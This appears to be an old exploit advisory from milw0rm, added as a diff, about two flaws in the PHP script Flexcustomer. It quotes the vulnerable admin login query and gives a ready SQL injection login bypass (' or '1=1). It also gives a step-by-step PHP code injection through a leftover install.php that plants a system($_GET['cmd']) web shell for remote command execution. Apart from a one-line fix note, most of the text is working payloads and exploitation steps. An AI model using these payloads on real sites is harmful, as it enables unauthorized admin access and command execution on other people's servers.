@@ -1,0 +1,56 @@
+[START]
+
+####################################################################################################################
+[0x01] Informations:
+
+Script         : Flexcustomer
+Download       : http://www.hotscripts.com/jump.php?listing_id=25331&jump_type=1
+Vulnerability  : Admin Login Bypass / Possible PHP code writing
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+
+
+####################################################################################################################
+[0x02] Bug: [Admin Login Bypass]
+######
+
+Bug: /[path]/admin/usercheek.php
+
+[CODE]
+
+<?php
+session_start();
+
+if (!empty($logincheck)){
+$sql = "select username,adminid from useradmin where username='$checkuser' and password='$checkpass'";
+$results = $db->select($sql);
+
+[/CODE]
+
+[!FIX] Escape $checkuser and $checkpass in $sql query.
+
+
+[!] EXPLOIT: /[path]/admin/
+             Put as username and password: ' or '1=1
+             You will log in as admin
+
+####################################################################################################################
+[0x03] Bug: [Possible PHP data writing]
+######
+
+This is not a real bug, but could become it if the administrator doesn't delete the install.php file.
+In fact, data that we put in /[path]/admin/install.php forms will be save in a .php file.
+So, if install.php is not deleted, we can inject php code, and this bug can become a RCE vulnerability.
+
+[!] EXPLOIT:
+              1) Go at: /[path]/admin/install.php
+              2) Put as Database Name this simple PHP code: ";system($_GET['cmd']);$a = "k
+              3) Fill the other form and press  Next
+              4) Execute your cmd: /[path]/const.inc.php?cmd=id
+
+####################################################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-29]
